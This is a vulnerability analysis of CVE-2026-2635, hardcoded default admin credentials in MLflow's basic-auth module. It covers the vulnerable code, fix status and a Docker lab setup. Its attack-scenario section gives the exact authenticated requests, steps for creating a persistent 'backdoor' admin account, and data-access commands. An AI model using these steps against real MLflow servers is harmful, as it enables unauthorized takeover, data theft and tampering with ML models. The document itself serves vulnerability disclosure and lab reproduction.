# Vulnerability Analysis: CVE-2026-2635

## CVE Summary

| Field | Value |
|---|---|
| **CVE ID** | CVE-2026-2635 |
| **Title** | MLflow Authentication Bypass via Default Credentials |
| **CVSS** | 9.8 Critical (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **CWE** | CWE-1393 (Use of Default Credentials) |
| **Affected Software** | MLflow v2.3.0 through v3.10.0+ (all versions with basic auth) |
| **Vulnerable Version Checked** | v3.9.0 (tag) — commit cf3d582a7b8a6f234e4d28ef6987bb8076c6ee54 |

---

## Root Cause

MLflow's HTTP Basic Authentication module ships with **hardcoded default administrator credentials** in a configuration file that is included in the package distribution. When the server starts with authentication enabled (`--app-name basic-auth`), it automatically creates an admin user in its SQLite database using these well-known credentials. There is **no mechanism** to force a password change on first login, no warning displayed to end-users via the API, and the password values are publicly documented in the open-source repository.

The root cause is a **design flaw**: the configuration file `basic_auth.ini` is part of the distributed Python package (listed in `pyproject.toml` under `[tool.setuptools.package-data]`), meaning every installation worldwide ships with identical default credentials. The `create_admin_user()` function silently creates the admin account at startup without any interactive prompt or mandatory password rotation.

### Credential History

| Version Range | Default Username | Default Password |
|---|---|---|
| v2.3.0 – v2.21.x (commit 0f6482f51 – pre-1f74f3f24) | `admin` | `password` |
| v2.22.0 – v3.10.0+ (commit 1f74f3f24 onward) | `admin` | `password1234` |

The password was changed from `password` to `password1234` in commit `1f74f3f24` (PR #15287, April 2025). This commit also added a `_validate_password()` function requiring passwords be 12+ characters, and the default password was lengthened to meet this new requirement. However, the password remains hardcoded and publicly known — this does **not** constitute a security fix.

---

## Vulnerable Files and Functions

### 1. Configuration File: `mlflow/server/auth/basic_auth.ini` (Lines 1-6)

```ini
[mlflow]
default_permission = READ
database_uri = sqlite:///basic_auth.db
admin_username = admin
admin_password = password1234
authorization_function = mlflow.server.auth:authenticate_request_basic_auth
```

This file is the **source of the hardcoded credentials**. It is distributed as part of the `mlflow` Python package via `pyproject.toml` package data:
```
server/auth/basic_auth.ini
```

### 2. Config Loader: `mlflow/server/auth/config.py` (Lines 18-36)

```python
def _get_auth_config_path() -> str:
    return (
        MLFLOW_AUTH_CONFIG_PATH.get() or Path(__file__).parent.joinpath("basic_auth.ini").resolve()
    )

def read_auth_config() -> AuthConfig:
    config_path = _get_auth_config_path()
    config = configparser.ConfigParser()
    config.read(config_path)
    return AuthConfig(
        default_permission=config["mlflow"]["default_permission"],
        database_uri=config["mlflow"]["database_uri"],
        admin_username=config["mlflow"]["admin_username"],
        admin_password=config["mlflow"]["admin_password"],
        ...
    )
```

The config is loaded **at module import time** (line 215 of `__init__.py`):
```python
auth_config = read_auth_config()
```

If the environment variable `MLFLOW_AUTH_CONFIG_PATH` is not set (the default), the built-in `basic_auth.ini` is used.

### 3. Admin User Creation: `mlflow/server/auth/__init__.py` (Lines 1483-1498)

```python
def create_admin_user(username, password):
    if not store.has_user(username):
        try:
            store.create_user(username, password, is_admin=True)
            _logger.info(
                f"Created admin user '{username}'. "
                "It is recommended that you set a new password as soon as possible "
                f"on {UPDATE_USER_PASSWORD}."
            )
        except MlflowException as e:
            if isinstance(e.__cause__, sqlalchemy.exc.IntegrityError):
                return
            raise
```

Called during `create_app()` at line 2291:
```python
create_admin_user(auth_config.admin_username, auth_config.admin_password)
```

Note: The log message says "it is recommended to change the password" — but this is only a server-side log message. No warning is displayed to the admin user or via the API.

### 4. Authentication Handler: `mlflow/server/auth/__init__.py` (Lines 1090-1101)

```python
def authenticate_request_basic_auth() -> Authorization | Response:
    if request.authorization is None:
        return make_basic_auth_response()
    username = request.authorization.username
    password = request.authorization.password
    if store.authenticate_user(username, password):
        return request.authorization
    else:
        return make_basic_auth_response()
```

### 5. Password Verification: `mlflow/server/auth/sqlalchemy_store.py` (Lines 45-51)

```python
def authenticate_user(self, username: str, password: str) -> bool:
    with self.ManagedSessionMaker() as session:
        try:
            user = self._get_user(session, username)
            return check_password_hash(user.password_hash, password)
        except MlflowException:
            return False
```

### 6. Authorization Bypass for Admins: `mlflow/server/auth/__init__.py` (Lines 1124-1140)

```python
def _before_request():
    if is_unprotected_route(request.path):
        return
    authorization = authenticate_request()
    if isinstance(authorization, Response):
        return authorization
    # admins don't need to be authorized
    if sender_is_admin():
        return
    ...
```

Once authenticated as admin, **all authorization checks are bypassed** (line 1139). The admin has unrestricted access to every API endpoint.

---

## Triggering Input

The vulnerability is triggered by sending any HTTP request to the MLflow REST API with an HTTP Basic Authentication header containing the default credentials.

### Exact HTTP Request

```
GET /api/2.0/mlflow/users/get?username=admin HTTP/1.1
Host: <target>:5000
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM0
```

The `Authorization` header value is the Base64 encoding of `admin:password1234`:
```
echo -n "admin:password1234" | base64
# Result: YWRtaW46cGFzc3dvcmQxMjM0
```

### For older versions (v2.3.0 – v2.21.x):
```
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
```
(Base64 of `admin:password`)

---

## Attack Scenario

### Prerequisites
1. Target MLflow server is running with authentication enabled (`--app-name basic-auth`)
2. Network access to the MLflow server (default port 5000)
3. The administrator has not changed the default password

### Step-by-Step Exploitation

1. **Verify authentication is enabled**: Send an unauthenticated request to the server. If auth is enabled, the server returns `401 Unauthorized` with `WWW-Authenticate: Basic realm="mlflow"`.

2. **Authenticate with default credentials**: Send a request with HTTP Basic Auth using `admin:password1234` (or `admin:password` for older versions).

3. **Confirm admin access**: Query the admin user details:
   ```
   GET /api/2.0/mlflow/users/get?username=admin
   Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM0
   ```
   A 200 response with `"is_admin": true` confirms full admin access.

4. **Escalate access** (persistence): Create a new admin user for persistent backdoor access:
   ```
   POST /api/2.0/mlflow/users/create
   Content-Type: application/json
   Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM0
   
   {"username": "backdoor", "password": "backdoorpass1234"}
   ```
   Then grant admin privileges:
   ```
   PATCH /api/2.0/mlflow/users/update-admin
   Content-Type: application/json
   Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM0
   
   {"username": "backdoor", "is_admin": true}
   ```

5. **Exfiltrate data**: Access all experiments, runs, models, and artifacts:
   ```
   GET /api/2.0/mlflow/experiments/search
   Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM0
   ```

6. **Modify/delete data**: Delete experiments, modify model versions, or tamper with ML pipeline artifacts.

---

## Impact

| Impact Category | Description |
|---|---|
| **Confidentiality** | Full read access to all experiments, runs, registered models, artifacts, and user data |
| **Integrity** | Full write/delete access to all MLflow resources; ability to modify ML models and artifacts |
| **Availability** | Ability to delete all experiments, models, and user accounts |
| **Privilege Escalation** | Ability to create new admin users and modify user permissions |
| **Supply Chain** | In ML pipelines, poisoned model artifacts could propagate downstream |

The attacker gains **complete administrative control** over the MLflow instance without any prior authentication. Since MLflow admins bypass all authorization checks (line 1139: `if sender_is_admin(): return`), every API endpoint is accessible.

---

## Authentication Requirements

**No authentication is required** — this is a pre-auth vulnerability. The attacker supplies the publicly known default credentials to authenticate.

### Auth Flow for PoC
1. Protocol: HTTP/HTTPS
2. Method: HTTP Basic Authentication
3. Header: `Authorization: Basic <base64(username:password)>`
4. Default credentials:
   - Username: `admin`
   - Password: `password1234` (v2.22.0+) or `password` (v2.3.0-v2.21.x)
5. No session tokens, cookies, or API keys needed — each request carries credentials in the header

### Unprotected Routes (no auth needed)
- `/static/*`
- `/favicon.ico`
- `/health`
- `/signup` (GET — renders signup form)

---

## Fix Assessment

### Current Status: **No fix exists**

As of v3.10.0 (the latest release) and the current HEAD of the repository, the hardcoded default credentials remain in `basic_auth.ini`. There is **no fix commit** addressing this vulnerability.

The only change to the default credentials was commit `1f74f3f24` (PR #15287, April 2025), which changed the default password from `password` to `password1234` and added a 12-character minimum password length validation. This was a password policy improvement, not a security fix for the default credentials issue.

### What a Proper Fix Would Require

A complete fix would need to address **all** of the following:

1. **Eliminate hardcoded default credentials**: Remove the plaintext `admin_username`/`admin_password` from `basic_auth.ini` or generate a random password on first startup
2. **Force password change on first login**: Implement a mechanism that requires the admin to change the default password before the server is fully operational
3. **Display the generated password securely**: If using random generation, print the initial password to the server console during first startup
4. **Warn on default credentials**: At minimum, display a prominent warning if the default password has not been changed

### Fix Incompleteness Analysis

The fix is incomplete because **no fix has been applied**. The hardcoded credentials `admin`/`password1234` are present in the distributed package and automatically provisioned at server startup with no forced password rotation.

Note: The CVE references PR #19260, but that PR addresses a different vulnerability (ZDI-CAN-26649 — artifact path traversal), not this default credentials issue.

---

## Potential Bypass Vectors

Since there is no fix, bypasses are not applicable in the traditional sense. However, even if a fix were applied (e.g., forcing password change on first use), the following vectors should be considered:

1. **Race condition in multi-worker startup**: The `create_admin_user()` function has a TOCTOU race between `store.has_user(username)` and `store.create_user()` (mitigated by catching `IntegrityError`, but the default password is still set on the winning worker)
2. **Environment variable override**: If `MLFLOW_AUTH_CONFIG_PATH` is set to a custom config file with different credentials, the default credentials would not apply — but this requires proactive configuration by the administrator
3. **Historical password variant**: Older versions (v2.3.0-v2.21.x) used `password` instead of `password1234` — both should be tested
4. **JWT auth fixture**: The test fixture `tests/server/auth/fixtures/jwt_auth.ini` also contains `admin_password = password` (the old default) — though this is not deployed in production, it demonstrates the pattern persists in test code

---

## Related Attack Surface

### Same Pattern in Test Configuration
- **File**: `tests/server/auth/fixtures/jwt_auth.ini` (line 5)
- **Code**: `admin_password = password`
- **Note**: Uses the old (pre-v2.22.0) default password. Not deployed in production but demonstrates the pattern.

### Test Utilities Reference Default Credentials
- **File**: `tests/server/auth/auth_test_utils.py` (lines 9-10)
- **Code**:
  ```python
  ADMIN_USERNAME = auth_config.admin_username
  ADMIN_PASSWORD = auth_config.admin_password
  ```
- **Note**: Test code reads and uses the default credentials, confirming they are a known quantity.

### No Other Hardcoded Credential Patterns Found
No other `.ini` files, configuration files, or Python source files in the `mlflow/` package directory contain hardcoded user credentials. The `password1234` literal appears only in `basic_auth.ini`.

---

## Build System

| Field | Value |
|---|---|
| **Language** | Python 3.10+ |
| **Build System** | setuptools (via `pyproject.toml`) |
| **Package Manager** | pip |
| **Version** | 3.9.0 |

### Build Commands

```bash
# Option 1: Install from PyPI (recommended for lab)
pip install "mlflow[auth]==3.9.0"

# Option 2: Install from source
cd source
pip install ".[auth]"
```

### Dependencies

**Core dependencies** (from `pyproject.toml`):
- Flask < 4
- Flask-CORS < 7
- SQLAlchemy < 3, >= 1.4.0
- gunicorn < 24 (Linux only)
- fastapi < 1
- uvicorn < 1
- protobuf < 7, >= 3.12.0
- numpy, pandas, scikit-learn, scipy (ML libraries)
- cryptography >= 43.0.0
- werkzeug (password hashing — transitive via Flask)

**Auth-specific dependency** (from `[project.optional-dependencies]`):
- Flask-WTF < 2 (for CSRF protection on signup form)

### Runtime Requirements

1. **Server startup command**:
   ```bash
   export MLFLOW_FLASK_SERVER_SECRET_KEY='test-secret-key'
   mlflow server --app-name basic-auth --host 0.0.0.0 --port 5000
   ```
   Note: `MLFLOW_FLASK_SERVER_SECRET_KEY` is **required** since recent versions (for CSRF protection). Without it, the server will throw an `MlflowException`.

2. **Network**: Port 5000 (default)

3. **Storage**: SQLite database (`basic_auth.db`) created automatically in the working directory

4. **No external services required**: The SQLite database is self-contained. No Redis, PostgreSQL, or other services needed.

### Docker Lab Recommendation

```dockerfile
FROM python:3.10-slim

RUN pip install "mlflow[auth]==3.9.0"

ENV MLFLOW_FLASK_SERVER_SECRET_KEY=test-secret-key-for-lab

EXPOSE 5000

CMD ["mlflow", "server", "--app-name", "basic-auth", "--host", "0.0.0.0", "--port", "5000"]
```

The server will:
1. Read `basic_auth.ini` from the installed package (containing `admin`/`password1234`)
2. Initialize a SQLite database
3. Create the admin user with default credentials
4. Start listening on port 5000 with HTTP Basic Auth enforcement

### Verification Commands

```bash
# Should return 401 (auth required)
curl -s -o /dev/null -w "%{http_code}" http://localhost:5000/api/2.0/mlflow/experiments/search

# Should return 200 with admin user data (vulnerability confirmed)
curl -s -o /dev/null -w "%{http_code}" -u admin:password1234 http://localhost:5000/api/2.0/mlflow/users/get?username=admin
```
